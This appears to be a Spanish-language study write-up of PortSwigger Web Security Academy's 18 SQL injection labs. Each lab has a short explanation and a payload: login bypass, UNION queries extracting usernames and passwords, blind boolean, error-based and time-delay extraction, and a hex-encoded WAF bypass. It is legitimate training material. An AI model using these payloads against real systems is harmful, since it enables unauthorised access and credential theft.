ROAD TO HALL OF FAME

Este módulo documenta el análisis técnico y resolución sistémica de los 18 laboratorios oficiales de PortSwigger Web Security Academy sobre SQL Injection.

Apprentice

1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Tipo: In-band (cláusula WHERE)

Explicación: Ocurre porque el input del usuario en el parámetro category se concatena directamente en una consulta WHERE. Permite romper la lógica booleana original insertando una condición (1=1).

Payload: ' OR 1=1--
Apprentice

2. SQL injection vulnerability allowing login bypass

Tipo: In-band (Autenticación)

Explicación: Mecanismo de autenticación vulnerable a la manipulación de consulta de login. Se comenta la verificación de password engañando al servidor para validar con solo el nombre de usuario.

Payload: administrator'--
Practitioner

3. SQL injection attack, querying the database type and version on Oracle

Tipo: In-band (UNION-based)

Explicación: Ataque de unión para extraer metadatos de versión en Oracle. Oracle requiere estructura UNION precisa y el uso de la tabla `v$version` para obtener el banner del sistema.

Payload: ' UNION SELECT banner, NULL FROM v$version--
Practitioner

4. SQL injection attack, querying the database type and version on MySQL and Microsoft

Tipo: UNION-based SQL Injection

Explicación: Extrae la cadena que describe la versión mediante inyección basada en unión, que requiere mismo número de columnas y tipos compatibles.

Payload: ' UNION SELECT @@version, NULL#
Practitioner

5. SQL injection attack, listing the database contents on non-Oracle databases

Tipo: UNION-based SQL Injection

Explicación: Enumeración del catálogo `information_schema` en PostgreSQL para reconstruir la estructura de la base de datos, extraer nombre de tabla y columnas hasta conseguir credencial.

Payload: ' UNION SELECT username_ifjekb, password_enyhpp FROM users_faborn--
Practitioner

6. SQL injection attack, listing the database contents on Oracle

Tipo: UNION-based SQL Injection

Explicación: Enumeración de metadatos en Oracle a través de `all_tables` y `all_tab_columns` en lugar de information_schema, respetando el uso necesario de SELECT estricto en mayúsculas.

Payload: ' UNION SELECT USERNAME_OCIROF, PASSWORD_CAPDCE FROM USERS_GGYPYC--
Apprentice

7. SQL injection UNION attack, determining the number of columns returned by the query

Tipo: In-band (Union-based)

Explicación: Determina la cantidad de columnas requerida sumando `NULL`s hasta obtener un response sin error.

Payload: ' UNION SELECT NULL, NULL, NULL--
Apprentice

8. SQL injection UNION attack, finding a column containing text

Tipo: In-band (Union-based)

Explicación: Tras hallar la cantidad de columnas, se inyecta tipo cadena y visualiza si el sistema la renderiza. Se localiza qué columna maneja string.

Payload: ' UNION SELECT NULL, 'tj2vPi', NULL--
Apprentice

9. SQL injection UNION attack, retrieving data from other tables

Tipo: In-band (Union-based)

Explicación: Exfiltrar los nombres de usuario y contraseñas de la tabla users y utilizarlos para iniciar sesión como administrador.

Payload: ' UNION SELECT username, password FROM users--
Apprentice

10. SQL injection UNION attack, retrieving multiple values in a single column

Tipo: In-band (Union-based)

Explicación: Si solo una columna procesa strings, se concatenan ambos valores de usuario y contraseña separados por símbolo.

Payload: UNION SELECT NULL, username || ':' || password FROM users--
Apprentice

11. Blind SQL injection with conditional responses

Tipo: Blind SQL injection

Explicación: Infiere información en base a un comportamiento de la interfaz como mensaje "Welcome back", permitiendo adivinar contraseña carácter a carácter con SUBSTRING.

Payload: ' AND (SELECT SUBSTRING(password, ..., 1) FROM users WHERE username = 'administrator') = '...'--
Apprentice

12. Blind SQL injection with conditional errors

Tipo: Blind SQL injection

Explicación: Se explota generando errores controlados (división por cero) de la base de datos originando códigos de estado 500 para corroborar veracidad.

Payload: ' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'a') THEN 1/0 ELSE '' END FROM users WHERE username='administrator') || '
Practitioner

13. Visible error-based SQL injection

Tipo: In-band (Error-based)

Explicación: Utiliza el CAST malicioso en la cookie intentando forzar la lectura del password entero como integer, el error resultante muestra el dato en crudo en la interfaz.

Payload: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
Practitioner

14. Blind SQL injection with time delays

Tipo: Inferential SQLi (Time-based)

Explicación: El punto de entrada es tracking cookie con peticiones síncronas que retienen respuesta. Se fuerza usar funciones como pg_sleep(10).

Payload: TrackingId=x'||pg_sleep(10)--
Practitioner

15. Blind SQL injection with time delays and information retrieval

Tipo: Inferential SQLi (Time-based)

Explicación: Usa el tiempo de respuesta como métrica combinando pg_sleep y condicionales CASE WHEN de las posiciones de SUBSTRING logrando fuerza bruta por tiempo.

Payload: TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
Practitioner

16. Blind SQL injection with out-of-band interaction

Tipo: Out-of-band SQL Injection

Explicación: Provoca resolución DNS en server de la base de datos en Oracle con vulnerabilidad OAST para interactuar con dominios externos usando EXTRACTVALUE y xmltype.

Payload: x' UNION SELECT EXTRACTVALUE(...) FROM dual--
Practitioner

17. Blind SQL injection with out-of-band data exfiltration

Tipo: Out-of-band SQL Injection

Explicación: Exfiltra la contraseña unida a una URL de petición externa controlada por el atacante en la cláusula SELECT EXTRACTVALUE.

Payload: XML Entity Injection with SQL logical subqueries
Practitioner

18. SQL injection with filter bypass via XML encoding

Tipo: WAF Bypass

Explicación: Evade el Web Application Firewall en un endpoint XML mediante la ofuscación codificada en hexadecimales `UNION` evitando detecciones WAF.

Payload: 1 &#x55;NION &#x53;ELECT username || '~' || password FROM users--
